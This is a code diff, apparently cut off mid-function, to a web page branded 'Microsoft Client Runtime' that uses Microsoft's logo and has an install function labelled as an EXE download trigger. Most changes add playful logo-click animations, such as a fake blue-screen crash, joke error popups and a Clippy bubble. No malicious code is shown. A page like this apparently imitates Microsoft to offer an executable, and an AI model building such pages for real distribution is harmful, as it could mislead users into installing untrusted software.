@@ -74,6 +74,7 @@
     display: inline-block; 
     transition: transform 0.15s ease;
     transform-origin: center center;
+    position: relative;
   }
   .icon-wrap:hover {
     transform: scale(1.1);
@@ -161,36 +162,36 @@
     top: 0; left: 0; right: 0; bottom: 0;
     background: #0078D7;
     color: white;
-    padding: 24px;
+    padding: 28px;
     font-family: 'Segoe UI', sans-serif;
     display: flex;
     flex-direction: column;
     justify-content: center;
     opacity: 0;
     pointer-events: none;
-    transition: opacity 0.15s ease;
+    transition: opacity 0.25s ease;
     z-index: 50;
     border-radius: 8px;
   }
   .bsod.show { opacity: 1; pointer-events: auto; }
-  .bsod-sad { font-size: 38px; margin-bottom: 12px; }
-  .bsod-text { font-size: 13px; line-height: 1.4; }
+  .bsod-sad { font-size: 42px; margin-bottom: 12px; }
+  .bsod-text { font-size: 13px; line-height: 1.5; }
 
   /* Windows Error Box */
   .win-error {
     position: fixed;
     background: #f0f0f0;
     border: 1px solid #0055ea;
-    box-shadow: 0 4px 16px rgba(0,0,0,0.3);
+    box-shadow: 0 6px 20px rgba(0,0,0,0.25);
     border-radius: 4px;
-    padding: 10px 14px;
+    padding: 12px 16px;
     font-size: 12px;
     color: #000;
     z-index: 200;
     display: flex;
     align-items: center;
-    gap: 8px;
-    animation: popIn 0.2s ease-out;
+    gap: 10px;
+    animation: popIn 0.25s cubic-bezier(0.18, 0.89, 0.32, 1.28);
   }
   @keyframes popIn {
     from { transform: scale(0.5); opacity: 0; }
@@ -201,16 +202,17 @@
   .clippy-bubble {
     position: absolute;
     top: 15px;
-    right: 25px;
+    right: 20px;
     background: #FFFFCC;
     border: 1px solid #999966;
     border-radius: 6px;
-    padding: 10px 12px;
+    padding: 12px 14px;
     font-size: 12px;
     color: #333300;
-    box-shadow: 0 3px 10px rgba(0,0,0,0.15);
+    box-shadow: 0 4px 12px rgba(0,0,0,0.15);
     z-index: 40;
-    max-width: 220px;
+    max-width: 230px;
+    line-height: 1.4;
     animation: popIn 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28);
   }
 
@@ -244,16 +246,16 @@
         <div class="bsod-text">
           <strong>Your PC ran into a problem and needs to restart.</strong><br><br>
           Stop Code: CRITICAL_LOGO_OVERLOAD<br>
-          Restarting in 1 second...
+          Collecting error info: <span id="bsodPercent">0%</span> complete
         </div>
       </div>
 
       <span class="icon-wrap" id="logo" onclick="logoClick()" title="Click me for a surprise!">
         <svg class="icon" id="logoSvg" viewBox="0 0 24 24" fill="none">
-          <rect x="1" y="1" width="10" height="10" fill="#F25022"/>
-          <rect x="13" y="1" width="10" height="10" fill="#7FBA00"/>
-          <rect x="1" y="13" width="10" height="10" fill="#00A4EF"/>
-          <rect x="13" y="13" width="10" height="10" fill="#FFB900"/>
+          <rect id="sq1" x="1" y="1" width="10" height="10" fill="#F25022"/>
+          <rect id="sq2" x="13" y="1" width="10" height="10" fill="#7FBA00"/>
+          <rect id="sq3" x="1" y="13" width="10" height="10" fill="#00A4EF"/>
+          <rect id="sq4" x="13" y="13" width="10" height="10" fill="#FFB900"/>
         </svg>
       </span>
       <h1>Microsoft Client Runtime</h1>
@@ -269,6 +271,19 @@
   <canvas id="gameCanvas"></canvas>
 
   <script>
+    // --- Safe Cross-Browser Rounded Rect Helper ---
+    function drawSafeRoundRect(ctx, x, y, w, h, r) {
+      ctx.beginPath();
+      ctx.moveTo(x + r, y);
+      ctx.lineTo(x + w - r, y);
+      ctx.quadraticCurveTo(x + w, y, x + w, y + r);
+      ctx.lineTo(x + w, y + h);
+      ctx.lineTo(x, y + h);
+      ctx.lineTo(x, y + r);
+      ctx.quadraticCurveTo(x, y, x + r, y);
+      ctx.closePath();
+    }
+
     // --- EXE Download Trigger ---
     function install() {
       const btn = document.getElementById('installBtn');
@@ -292,7 +307,7 @@
       }, 1000);
     }
 
-    // --- FX Canvas for Particle & Laser Animations ---
+    // --- Particle Engine ---
     const fxCanvas = document.getElementById('fxCanvas');
     const fxCtx = fxCanvas.getContext('2d');
     let fxParticles = [];
@@ -308,21 +323,19 @@
     function fxLoop() {
       fxCtx.clearRect(0, 0, fxCanvas.width, fxCanvas.height);
 
-      // Run active custom render routines (Laser, Matrix, Black Hole)
       for (let i = customRenderers.length - 1; i >= 0; i--) {
         if (!customRenderers[i](fxCtx)) {
           customRenderers.splice(i, 1);
         }
       }
 
-      // Render standard particle physics
       for (let i = fxParticles.length - 1; i >= 0; i--) {
         const p = fxParticles[i];
         p.x += p.vx;
         p.y += p.vy;
         p.vy += p.gravity !== undefined ? p.gravity : 0.25;
-        p.alpha -= p.decay || 0.02;
-        p.rot += p.vrot || 0.1;
+        p.alpha -= p.decay || 0.015;
+        p.rot += p.vrot || 0.08;
 
         if (p.alpha <= 0) {
           fxParticles.splice(i, 1);
@@ -334,7 +347,10 @@
         fxCtx.rotate(p.rot);
         fxCtx.fillStyle = p.color;
         fxCtx.globalAlpha = Math.max(0, p.alpha);
-        if (p.isCircle) {
+        if (p.isText) {
+          fxCtx.font = `${p.size}px sans-serif`;
+          fxCtx.fillText(p.text || '♥', 0, 0);
+        } else if (p.isCircle) {
           fxCtx.beginPath();
           fxCtx.arc(0, 0, p.size, 0, Math.PI * 2);
           fxCtx.fill();
@@ -348,13 +364,14 @@
     fxLoop();
 
     // --- Screen Shake ---
-    function shakeScreen(duration = 15, intensity = 12) {
+    function shakeScreen(duration = 20, intensity = 12) {
       const card = document.getElementById('mainCard');
       let f = 0;
       const shake = () => {
         f++;
-        const sX = (Math.random() - 0.5) * intensity * (1 - f / duration);
-        const sY = (Math.random() - 0.5) * intensity * (1 - f / duration);
+        const decay = Math.max(0, 1 - f / duration);
+        const sX = (Math.random() - 0.5) * intensity * decay;
+        const sY = (Math.random() - 0.5) * intensity * decay;
         card.style.transform = `translate(${sX}px, ${sY}px)`;
         if (f < duration) requestAnimationFrame(shake);
         else card.style.transform = '';
@@ -362,7 +379,7 @@
       shake();
     }
 
-    // --- Random Stuff Controller ---
+    // --- 20 Random Events Engine ---
     let isEventActive = false;
     const msColors = ['#F25022', '#7FBA00', '#00A4EF', '#FFB900'];
 
@@ -371,16 +388,16 @@
 
       const roll = Math.random();
 
-      // 🏆 ~12% RARE JACKPOT: Hardcore Geometry Dash Mini Game
-      if (roll < 0.12) {
+      // 🏆 ULTRA-RARE 4% CHANCE: Hardcore Geometry Dash Mini-Game
+      if (roll < 0.04) {
         isEventActive = true;
         startMiniGameSequence();
         return;
       }
 
-      // 🎲 ~88% CHANCES: 1 of 11 Random Fun Events
+      // 🎲 96% COMMON CHANCES: 1 of 20 Random Events
       isEventActive = true;
-      const eventRoll = Math.floor(Math.random() * 11);
+      const eventRoll = Math.floor(Math.random() * 20);
 
       switch (eventRoll) {
         case 0: eventExplosion(); break;
@@ -394,360 +411,332 @@
         case 8: eventLaserStrike(); break;
         case 9: eventElasticJello(); break;
         case 10: eventClippyPopup(); break;
+        case 11: eventGravityDrop(); break;
+        case 12: eventGhostFloat(); break;
+        case 13: eventTornadoSpin(); break;
+        case 14: eventHeartbeat(); break;
+        case 15: eventFreezeShatter(); break;
+        case 16: eventDownloadRam(); break;
+        case 17: eventEarthquake(); break;
+        case 18: eventNeonRgbWave(); break;
+        case 19: eventSlotMachine(); break;
       }
     }
 
-    // --- EVENT 0: Massive Explosion ---
+    // 1. Explosion
     function eventExplosion() {
       const logo = document.getElementById('logo');
-      const rect = logo.getBoundingClientRect();
-      const cx = rect.left + rect.width / 2;
-      const cy = rect.top + rect.height / 2;
-
-      logo.style.visibility = 'hidden';
-      shakeScreen(20, 20);
-
-      for (let i = 0; i < 70; i++) {
-        const angle = Math.random() * Math.PI * 2;
-        const sp = 4 + Math.random() * 14;
-        fxParticles.push({
-          x: cx,
-          y: cy,
-          vx: Math.cos(angle) * sp,
-          vy: Math.sin(angle) * sp - 2,
-          color: Math.random() > 0.3 ? msColors[Math.floor(Math.random() * 4)] : '#FFA500',
-          size: 4 + Math.random() * 10,
-          rot: Math.random() * Math.PI,
-          vrot: (Math.random() - 0.5) * 0.4,
-          gravity: 0.35,
-          decay: 0.018,
-          alpha: 1
-        });
-      }
+      const r = logo.getBoundingClientRect();
+      const cx = r.left + r.width / 2, cy = r.top + r.height / 2;
+      
+      logo.style.transform = 'scale(0.85)';
+      shakeScreen(6, 4);
 
       setTimeout(() => {
-        logo.style.visibility = 'visible';
-        logo.style.transform = 'scale(0)';
-        logo.style.transition = 'transform 0.35s cubic-bezier(0.18, 0.89, 0.32, 1.28)';
-        setTimeout(() => { logo.style.transform = 'scale(1)'; }, 20);
-        setTimeout(() => { logo.style.transition = ''; isEventActive = false; }, 400);
-      }, 900);
+        logo.style.visibility = 'hidden';
+        shakeScreen(24, 20);
+
+        for (let i = 0; i < 85; i++) {
+          const a = Math.random() * Math.PI * 2, sp = 3 + Math.random() * 14;
+          fxParticles.push({
+            x: cx, y: cy, vx: Math.cos(a) * sp, vy: Math.sin(a) * sp - 2,
+            color: Math.random() > 0.25 ? msColors[Math.floor(Math.random() * 4)] : '#FFA500',
+            size: 4 + Math.random() * 9, rot: Math.random() * Math.PI, vrot: (Math.random() - 0.5) * 0.3,
+            gravity: 0.3, decay: 0.012, alpha: 1
+          });
+        }
+
+        setTimeout(() => {
+          logo.style.visibility = 'visible';
+          logo.style.transform = 'scale(0)';
+          logo.style.transition = 'transform 0.45s cubic-bezier(0.18, 0.89, 0.32, 1.28)';
+          setTimeout(() => { logo.style.transform = 'scale(1)'; }, 20);
+          setTimeout(() => { logo.style.transition = ''; isEventActive = false; }, 500);
+        }, 1100);
+      }, 180);
     }
 
-    // --- EVENT 1: Rocket Launch ---
+    // 2. Rocket Launch
     function eventRocketLaunch() {
       const logo = document.getElementById('logo');
-      const rect = logo.getBoundingClientRect();
-
-      let frame = 0;
-      let y = 0;
-      let vy = 0;
+      const r = logo.getBoundingClientRect();
+      let frame = 0, y = 0, vy = 0;
 
       const launch = () => {
         frame++;
-        if (frame < 18) {
+        if (frame < 24) {
           logo.style.transform = `translate(${(Math.random() - 0.5) * 6}px, ${(Math.random() - 0.5) * 6}px)`;
           if (frame % 2 === 0) {
             fxParticles.push({
-              x: rect.left + rect.width / 2 + (Math.random() - 0.5) * 15,
-              y: rect.top + rect.height,
-              vx: (Math.random() - 0.5) * 3,
-              vy: 2 + Math.random() * 4,
-              color: '#FFA500',
-              size: 5 + Math.random() * 6,
-              alpha: 1,
-              decay: 0.05,
-              isCircle: true
+              x: r.left + r.width / 2 + (Math.random() - 0.5) * 16, y: r.top + r.height,
+              vx: (Math.random() - 0.5) * 4, vy: 3 + Math.random() * 4,
+              color: '#FFA500', size: 6 + Math.random() * 6, alpha: 1, decay: 0.04, isCircle: true
             });
           }
           requestAnimationFrame(launch);
         } else {
-          vy -= 1.8;
-          y += vy;
-          logo.style.transform = `translateY(${y}px) rotate(${y * 1.5}deg) scale(0.8)`;
-
-          if (y > -window.innerHeight) {
-            requestAnimationFrame(launch);
-          } else {
-            setTimeout(() => {
-              logo.style.transition = 'transform 0.6s cubic-bezier(0.16, 1, 0.3, 1)';
-              logo.style.transform = 'translateY(0) scale(1)';
-              setTimeout(() => {
-                logo.style.transition = '';
-                isEventActive = false;
-              }, 600);
-            }, 300);
+          vy -= 1.6; y += vy;
+          logo.style.transform = `translateY(${y}px) rotate(${y * 1.2}deg) scale(0.85)`;
+          if (y > -window.innerHeight - 50) requestAnimationFrame(launch);
+          else {
+            let pFrame = 0;
+            y = -window.innerHeight * 0.7;
+            const parachuteDescend = () => {
+              pFrame++;
+              y += 3.5;
+              const sway = Math.sin(pFrame * 0.12) * 22;
+              logo.style.transform = `translate(${sway}px, ${y}px) rotate(${sway * 0.6}deg)`;
+              if (y < 0) requestAnimationFrame(parachuteDescend);
+              else {
+                logo.style.transition = 'transform 0.4s cubic-bezier(0.18, 0.89, 0.32, 1.28)';
+                logo.style.transform = 'translate(0px, 0px) scale(1)';
+                setTimeout(() => { logo.style.transition = ''; isEventActive = false; }, 400);
+              }
+            };
+            parachuteDescend();
           }
         }
       };
       launch();
     }
 
-    // --- EVENT 2: BSOD Crash Glitch ---
+    // 3. BSOD Glitch
     function eventBsodGlitch() {
       const bsod = document.getElementById('bsod');
-      shakeScreen(15, 14);
+      const percentEl = document.getElementById('bsodPercent');
+      shakeScreen(16, 12);
       bsod.classList.add('show');
 
-      setTimeout(() => {
-        bsod.classList.remove('show');
-        isEventActive = false;
-      }, 1400);
+      let pct = 0;
+      const interval = setInterval(() => {
+        pct += Math.floor(Math.random() * 25) + 10;
+        if (pct >= 100) {
+          pct = 100;
+          clearInterval(interval);
+          setTimeout(() => {
+            bsod.classList.remove('show');
+            isEventActive = false;
+          }, 350);
+        }
+        if (percentEl) percentEl.textContent = `${pct}%`;
+      }, 180);
     }
 
-    // --- EVENT 3: Windows Error Cascades ---
+    // 4. Windows Errors
     function eventWindowsErrors() {
       const texts = [
         '⚠️ Error: Logo clicked too hard',
-        '❌ Exception in thread "Logo"',
+        '❌ Exception: Overclocking detected',
         'ℹ️ Task Failed Successfully',
         '⛔ Access Denied: Mini Game Locked',
-        '🔄 404: Game Not Found (Try Again!)'
+        '🔄 404: Secret Game not found (Try Again!)'
       ];
-
-      for (let i = 0; i < 5; i++) {
+      for (let i = 0; i < texts.length; i++) {
         setTimeout(() => {
           const err = document.createElement('div');
           err.className = 'win-error';
           err.innerHTML = `<span>${texts[i]}</span>`;
-          err.style.left = (window.innerWidth / 2 - 120 + (Math.random() - 0.5) * 180) + 'px';
-          err.style.top = (window.innerHeight / 2 - 100 + (Math.random() - 0.5) * 180) + 'px';
+          err.style.left = (window.innerWidth / 2 - 120 + (Math.random() - 0.5) * 160) + 'px';
+          err.style.top = (window.innerHeight / 2 - 100 + (Math.random() - 0.5) * 160) + 'px';
           document.body.appendChild(err);
 
           setTimeout(() => {
             const r = err.getBoundingClientRect();
             for (let k = 0; k < 12; k++) {
               fxParticles.push({
-                x: r.left + r.width / 2,
-                y: r.top + r.height / 2,
-                vx: (Math.random() - 0.5) * 8,
-                vy: (Math.random() - 0.5) * 8,
-                color: msColors[k % 4],
-                size: 4 + Math.random() * 4,
-                alpha: 1,
-                decay: 0.04
+                x: r.left + r.width / 2, y: r.top + r.height / 2,
+                vx: (Math.random() - 0.5) * 8, vy: (Math.random() - 0.5) * 8,
+                color: msColors[k % 4], size: 4 + Math.random() * 4, alpha: 1, decay: 0.03
               });
             }
             err.remove();
-            if (i === 4) isEventActive = false;
-          }, 600);
-        }, i * 160);
+            if (i === texts.length - 1) isEventActive = false;
+          }, 700);
+        }, i * 220);
       }
     }
 
-    // --- EVENT 4: Disco Confetti Party ---
+    // 5. Disco Party
     function eventDiscoParty() {
       const logo = document.getElementById('logo');
-      const rect = logo.getBoundingClientRect();
-      const cx = rect.left + rect.width / 2;
-      const cy = rect.top + rect.height / 2;
-
+      const r = logo.getBoundingClientRect();
+      const cx = r.left + r.width / 2, cy = r.top + r.height / 2;
       let f = 0;
       const party = () => {
         f++;
-        logo.style.transform = `rotate(${f * 36}deg) scale(${1 + Math.sin(f * 0.4) * 0.25})`;
-
+        logo.style.transform = `rotate(${f * 24}deg) scale(${1 + Math.sin(f * 0.25) * 0.25})`;
         if (f % 2 === 0) {
           fxParticles.push({
-            x: cx + (Math.random() - 0.5) * 40,
-            y: cy + (Math.random() - 0.5) * 40,
-            vx: (Math.random() - 0.5) * 10,
-            vy: -4 - Math.random() * 6,
-            color: `hsl(${Math.random() * 360}, 90%, 60%)`,
-            size: 6 + Math.random() * 6,
-            alpha: 1,
-            decay: 0.025,
-            vrot: 0.2
+            x: cx + (Math.random() - 0.5) * 60, y: cy + (Math.random() - 0.5) * 60,
+            vx: (Math.random() - 0.5) * 10, vy: -3 - Math.random() * 7,
+            color: `hsl(${Math.random() * 360}, 90%, 60%)`, size: 6 + Math.random() * 6,
+            alpha: 1, decay: 0.018, vrot: 0.15
           });
         }
-
-        if (f < 35) {
-          requestAnimationFrame(party);
-        } else {
-          logo.style.transform = '';
-          isEventActive = false;
+        if (f < 70) requestAnimationFrame(party);
+        else { 
+          logo.style.transform = ''; 
+          isEventActive = false; 
         }
       };
       party();
     }
 
-    // --- EVENT 5: Black Hole Singularity ---
+    // 6. Black Hole
     function eventBlackHole() {
       const logo = document.getElementById('logo');
-      const rect = logo.getBoundingClientRect();
-      const cx = rect.left + rect.width / 2;
-      const cy = rect.top + rect.height / 2;
-
+      const r = logo.getBoundingClientRect();
+      const cx = r.left + r.width / 2, cy = r.top + r.height / 2;
       let f = 0;
-      customRenderers.push((ctx) => {
+
+      customRenderers.push(() => {
         f++;
-        if (f < 45) {
-          // Vortex suck
-          logo.style.transform = `scale(${Math.max(0.05, 1 - f / 45)}) rotate(${f * 30}deg)`;
-          for (let i = 0; i < 4; i++) {
-            const angle = Math.random() * Math.PI * 2;
-            const dist = 70 + Math.random() * 50;
+        if (f < 60) {
+          logo.style.transform = `scale(${Math.max(0.05, 1 - f / 60)}) rotate(${f * 25}deg)`;
+          for (let i = 0; i < 3; i++) {
+            const a = Math.random() * Math.PI * 2, d = 60 + Math.random() * 60;
             fxParticles.push({
-              x: cx + Math.cos(angle) * dist,
-              y: cy + Math.sin(angle) * dist,
-              vx: -Math.cos(angle) * 4,
-              vy: -Math.sin(angle) * 4,
-              color: '#0078D4',
-              size: 3,
-              alpha: 1,
-              decay: 0.05,
-              isCircle: true
+              x: cx + Math.cos(a) * d, y: cy + Math.sin(a) * d,
+              vx: -Math.cos(a) * 3.5, vy: -Math.sin(a) * 3.5,
+              color: '#0078D4', size: 3, alpha: 1, decay: 0.04, isCircle: true
             });
           }
           return true;
-        } else if (f === 45) {
-          // Supernova Burst
-          shakeScreen(15, 16);
-          for (let i = 0; i < 60; i++) {
-            const a = Math.random() * Math.PI * 2;
-            const sp = 4 + Math.random() * 10;
+        } else if (f === 60) {
+          shakeScreen(20, 18);
+          for (let i = 0; i < 70; i++) {
+            const a = Math.random() * Math.PI * 2, sp = 4 + Math.random() * 11;
             fxParticles.push({
-              x: cx,
-              y: cy,
-              vx: Math.cos(a) * sp,
-              vy: Math.sin(a) * sp,
-              color: msColors[i % 4],
-              size: 5 + Math.random() * 6,
-              alpha: 1,
-              decay: 0.025
+              x: cx, y: cy, vx: Math.cos(a) * sp, vy: Math.sin(a) * sp,
+              color: msColors[i % 4], size: 5 + Math.random() * 7, alpha: 1, decay: 0.018
             });
           }
           logo.style.transform = 'scale(0)';
           setTimeout(() => {
-            logo.style.transition = 'transform 0.4s cubic-bezier(0.18, 0.89, 0.32, 1.28)';
+            logo.style.transition = 'transform 0.45s cubic-bezier(0.18, 0.89, 0.32, 1.28)';
             logo.style.transform = 'scale(1)';
-            setTimeout(() => { logo.style.transition = ''; isEventActive = false; }, 400);
-          }, 200);
+            setTimeout(() => { logo.style.transition = ''; isEventActive = false; }, 450);
+          }, 300);
           return false;
         }
       });
     }
 
-    // --- EVENT 6: Matrix Digital Rain ---
+    // 7. Matrix Rain
     function eventMatrixRain() {
       const card = document.getElementById('mainCard');
-      const rect = card.getBoundingClientRect();
-      const cols = Math.floor(rect.width / 18);
-      const drops = Array(cols).fill(0);
+      const logo = document.getElementById('logo');
+      const r = card.getBoundingClientRect();
+      const cols = Math.floor(r.width / 16), drops = Array(cols).fill(0);
       const chars = "010101MICROSOFTCLIENTRUNTIME101";
-
       let f = 0;
+
+      logo.style.filter = 'hue-rotate(90deg) brightness(1.6)';
+
       customRenderers.push((ctx) => {
         f++;
-        ctx.fillStyle = "rgba(0, 0, 0, 0.15)";
-        ctx.fillRect(rect.left, rect.top, rect.width, rect.height);
+        ctx.fillStyle = "rgba(0, 0, 0, 0.12)";
+        ctx.fillRect(r.left, r.top, r.width, r.height);
         ctx.fillStyle = "#00FF66";
-        ctx.font = "13px monospace";
+        ctx.font = "12px monospace";
 
         for (let i = 0; i < drops.length; i++) {
           const text = chars[Math.floor(Math.random() * chars.length)];
-          const x = rect.left + i * 18;
-          const y = rect.top + drops[i] * 18;
+          const x = r.left + i * 16;
+          const y = r.top + drops[i] * 16;
           ctx.fillText(text, x, y);
-          if (y > rect.bottom && Math.random() > 0.95) drops[i] = 0;
+          if (y > r.bottom && Math.random() > 0.94) drops[i] = 0;
           drops[i]++;
         }
-
-        if (f < 50) return true;
-        else {
-          isEventActive = false;
-          return false;
+        if (f < 75) return true;
+        else { 
+          logo.style.filter = '';
+          isEventActive = false; 
+          return false; 
         }
       });
     }
 
-    // --- EVENT 7: Tile Physics Scatter (Billiard Bounce) ---
+    // 8. Tile Physics Scatter
     function eventTileScatter() {
-      const logo = document.getElementById('logo');
-      const card = document.getElementById('mainCard');
-      const cRect = card.getBoundingClientRect();
-      const lRect = logo.getBoundingClientRect();
-
+      const logo = document.getElementById('logo'), card = document.getElementById('mainCard');
+      const cRect = card.getBoundingClientRect(), lRect = logo.getBoundingClientRect();
       logo.style.visibility = 'hidden';
 
       const tiles = [
-        { color: '#F25022', x: lRect.left, y: lRect.top, vx: -6, vy: -5 },
-        { color: '#7FBA00', x: lRect.left + 22, y: lRect.top, vx: 6, vy: -6 },
-        { color: '#00A4EF', x: lRect.left, y: lRect.top + 22, vx: -5, vy: 6 },
-        { color: '#FFB900', x: lRect.left + 22, y: lRect.top + 22, vx: 7, vy: 5 }
+        { color: '#F25022', x: lRect.left, y: lRect.top, vx: -6, vy: -5, homeX: lRect.left, homeY: lRect.top },
+        { color: '#7FBA00', x: lRect.left + 22, y: lRect.top, vx: 6, vy: -6, homeX: lRect.left + 22, homeY: lRect.top },
+        { color: '#00A4EF', x: lRect.left, y: lRect.top + 22, vx: -5, vy: 6, homeX: lRect.left, homeY: lRect.top + 22 },
+        { color: '#FFB900', x: lRect.left + 22, y: lRect.top + 22, vx: 7, vy: 5, homeX: lRect.left + 22, homeY: lRect.top + 22 }
       ];
-
       let f = 0;
+
       customRenderers.push((ctx) => {
         f++;
-        tiles.forEach((t) => {
-          t.x += t.vx;
-          t.y += t.vy;
-          t.vy += 0.35; // gravity
-
-          // Bounce off card walls
-          if (t.x < cRect.left || t.x > cRect.right - 20) t.vx *= -0.85;
-          if (t.y > cRect.bottom - 20) { t.y = cRect.bottom - 20; t.vy *= -0.85; }
-
-          ctx.fillStyle = t.color;
-          ctx.fillRect(t.x, t.y, 20, 20);
-        });
-
-        if (f < 45) return true;
-        else {
-          // Snap back
+        if (f < 50) {
+          tiles.forEach(t => {
+            t.x += t.vx; t.y += t.vy; t.vy += 0.35;
+            if (t.x < cRect.left || t.x > cRect.right - 20) t.vx *= -0.85;
+            if (t.y > cRect.bottom - 20) { t.y = cRect.bottom - 20; t.vy *= -0.85; }
+            ctx.fillStyle = t.color;
+            ctx.fillRect(t.x, t.y, 20, 20);
+          });
+          return true;
+        } else if (f < 75) {
+          const ease = (f - 50) / 25;
+          tiles.forEach(t => {
+            const curX = t.x + (t.homeX - t.x) * ease;
+            const curY = t.y + (t.homeY - t.y) * ease;
+            ctx.fillStyle = t.color;
+            ctx.fillRect(curX, curY, 20, 20);
+          });
+          return true;
+        } else {
           logo.style.visibility = 'visible';
           logo.style.transform = 'scale(0)';
-          logo.style.transition = 'transform 0.3s cubic-bezier(0.18, 0.89, 0.32, 1.28)';
+          logo.style.transition = 'transform 0.35s cubic-bezier(0.18, 0.89, 0.32, 1.28)';
           setTimeout(() => { logo.style.transform = 'scale(1)'; }, 20);
-          setTimeout(() => { logo.style.transition = ''; isEventActive = false; }, 350);
+          setTimeout(() => { logo.style.transition = ''; isEventActive = false; }, 400);
           return false;
         }
       });
     }
 
-    // --- EVENT 8: Orbital Laser Strike ---
+    // 9. Orbital Laser Strike
     function eventLaserStrike() {
-      const logo = document.getElementById('logo');
-      const rect = logo.getBoundingClientRect();
-      const cx = rect.left + rect.width / 2;
-      const cy = rect.top + rect.height / 2;
-
+      const logo = document.getElementById('logo'), r = logo.getBoundingClientRect();
+      const cx = r.left + r.width / 2, cy = r.top + r.height / 2;
       let f = 0;
-      shakeScreen(18, 14);
+      shakeScreen(24, 16);
 
       customRenderers.push((ctx) => {
         f++;
-        if (f < 20) {
-          // Glowing orbital beam
-          ctx.strokeStyle = `rgba(0, 164, 239, ${0.9 - f * 0.03})`;
-          ctx.lineWidth = 14 - f * 0.5;
-          ctx.beginPath();
-          ctx.moveTo(cx, 0);
-          ctx.lineTo(cx, cy);
-          ctx.stroke();
+        if (f < 15) {
+          ctx.strokeStyle = '#FF0000'; ctx.lineWidth = 2;
+          ctx.beginPath(); ctx.arc(cx, cy, 25 - f, 0, Math.PI * 2); ctx.stroke();
+          return true;
+        } else if (f < 45) {
+          ctx.strokeStyle = 'rgba(0, 164, 239, 0.85)';
+          ctx.lineWidth = 16;
+          ctx.beginPath(); ctx.moveTo(cx, 0); ctx.lineTo(cx, cy); ctx.stroke();
 
-          // Laser core
           ctx.strokeStyle = '#FFFFFF';
-          ctx.lineWidth = 5;
-          ctx.beginPath();
-          ctx.moveTo(cx, 0);
-          ctx.lineTo(cx, cy);
-          ctx.stroke();
+          ctx.lineWidth = 6;
+          ctx.beginPath(); ctx.moveTo(cx, 0); ctx.lineTo(cx, cy); ctx.stroke();
 
-          // Sparks at strike point
-          for (let i = 0; i < 4; i++) {
+          for (let i = 0; i < 3; i++) {
             fxParticles.push({
-              x: cx,
-              y: cy,
-              vx: (Math.random() - 0.5) * 12,
-              vy: -Math.random() * 8,
-              color: '#00A4EF',
-              size: 4,
-              alpha: 1,
-              decay: 0.06
+              x: cx, y: cy, vx: (Math.random() - 0.5) * 12, vy: -Math.random() * 7,
+              color: '#00A4EF', size: 4, alpha: 1, decay: 0.04
             });
           }
+          return true;
+        } else if (f < 65) {
+          fxParticles.push({
+            x: cx + (Math.random() - 0.5) * 14, y: cy,
+            vx: (Math.random() - 0.5) * 2, vy: -2,
+            color: '#DDDBD9', size: 6, alpha: 0.7, decay: 0.03, isCircle: true
+          });
           return true;
         } else {
           isEventActive = false;
@@ -756,55 +745,252 @@
       });
     }
 
-    // --- EVENT 9: Elastic Jello Rubber Bounce ---
+    // 10. Elastic Jello Wobble
     function eventElasticJello() {
       const logo = document.getElementById('logo');
       let f = 0;
       const wobble = () => {
         f++;
-        const sX = 1 + Math.sin(f * 0.6) * Math.exp(-f * 0.08) * 0.9;
-        const sY = 1 + Math.cos(f * 0.6) * Math.exp(-f * 0.08) * 0.9;
+        const sX = 1 + Math.sin(f * 0.4) * Math.exp(-f * 0.05) * 0.9;
+        const sY = 1 + Math.cos(f * 0.4) * Math.exp(-f * 0.05) * 0.9;
         logo.style.transform = `scale(${sX}, ${sY})`;
-
-        if (f < 40) requestAnimationFrame(wobble);
-        else {
-          logo.style.transform = '';
-          isEventActive = false;
-        }
+        if (f < 60) requestAnimationFrame(wobble);
+        else { logo.style.transform = ''; isEventActive = false; }
       };
       wobble();
     }
 
-    // --- EVENT 10: Clippy Retro Assistant ---
+    // 11. Clippy Retro Assistant
     function eventClippyPopup() {
       const card = document.getElementById('mainCard');
       const bubble = document.createElement('div');
       bubble.className = 'clippy-bubble';
-      bubble.innerHTML = `<strong>📎 Assistant:</strong><br>It looks like you're poking the logo! Would you like help opening the secret game?`;
+      bubble.innerHTML = `<strong>📎 Clippy:</strong><br>It looks like you're poking the logo! Would you like help opening the secret game?`;
       card.appendChild(bubble);
 
       setTimeout(() => {
-        bubble.style.transition = 'opacity 0.3s, transform 0.3s';
-        bubble.style.opacity = '0';
-        bubble.style.transform = 'scale(0.7)';
-        setTimeout(() => {
-          bubble.remove();
-          isEventActive = false;
-        }, 300);
-      }, 1800);
+        bubble.style.transition = 'opacity 0.4s, transform 0.4s';
+        bubble.style.opacity = '0'; bubble.style.transform = 'scale(0.7)';
+        setTimeout(() => { bubble.remove(); isEventActive = false; }, 400);
+      }, 2200);
     }
 
-    // --- RARE JACKPOT MINI-GAME SEQUENCE (~12% Roll) ---
-    function startMiniGameSequence() {
+    // 12. Gravity Drop & Thud
+    function eventGravityDrop() {
       const logo = document.getElementById('logo');
-      const canvas = document.getElementById('gameCanvas');
+      logo.style.transition = 'transform 0.45s cubic-bezier(0.55, 0.055, 0.675, 0.19)';
+      logo.style.transform = 'translateY(175px)';
 
+      setTimeout(() => {
+        shakeScreen(14, 10);
+        logo.style.transform = 'translateY(175px) scale(1.5, 0.4)';
+        setTimeout(() => {
+          logo.style.transition = 'transform 0.65s cubic-bezier(0.175, 0.885, 0.32, 1.275)';
+          logo.style.transform = 'translateY(0) scale(1)';
+          setTimeout(() => { logo.style.transition = ''; isEventActive = false; }, 650);
+        }, 180);
+      }, 450);
+    }
+
+    // 13. Ghost Float
+    function eventGhostFloat() {
+      const logo = document.getElementById('logo');
+      let f = 0;
+      logo.style.filter = 'drop-shadow(0 0 14px #00A4EF) invert(0.2)';
+      logo.style.opacity = '0.7';
+
+      const ghost = () => {
+        f++;
+        const x = Math.sin(f * 0.09) * 40;
+        const y = Math.cos(f * 0.06) * 25 - 15;
+        logo.style.transform = `translate(${x}px, ${y}px) rotate(${x * 0.4}deg)`;
+        if (f < 75) requestAnimationFrame(ghost);
+        else {
+          logo.style.transform = '';
+          logo.style.filter = '';
+          logo.style.opacity = '1';
+          isEventActive = false;
+        }
+      };
+      ghost();
+    }
+
+    // 14. Tornado Whirlwind
+    function eventTornadoSpin() {
+      const logo = document.getElementById('logo'), r = logo.getBoundingClientRect();
+      const cx = r.left + r.width / 2, cy = r.top + r.height / 2;
+      let f = 0;
+
+      const twister = () => {
+        f++;
+        logo.style.transform = `rotate(${f * 36}deg) scale(${1 + Math.sin(f * 0.2) * 0.2})`;
+        for (let i = 0; i < 2; i++) {
+          const a = f * 0.3 + i * Math.PI;
+          fxParticles.push({
+            x: cx + Math.cos(a) * (f * 1.2), y: cy + (25 - f * 0.7),
